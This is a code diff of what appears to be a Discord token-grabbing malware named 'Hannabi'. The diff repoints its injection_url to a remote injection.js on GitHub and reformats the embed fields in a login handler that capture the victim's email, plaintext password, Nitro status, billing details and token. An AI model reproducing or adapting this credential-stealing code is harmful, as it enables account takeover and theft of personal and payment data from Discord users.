@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Hannabi', 
   embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'), 
   embed_color: 8363488, 
-  injection_url: 'https://raw.githubusercontent.com/Rldqzo/test3/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Rldqzo/Rkdzqdzq21dqz123d231qzqdz/main/injection.js', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -658,13 +658,13 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: "Email: **${email}** - \nPassword: ```**${password}**```",
-            inline: false,
+            value: `Email: **${email}** - \nPassword: **${password}**`,
+            inline: true,
           },
           {
             name: '**Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            inline: true,
           },
           {
             name: '**Token**',
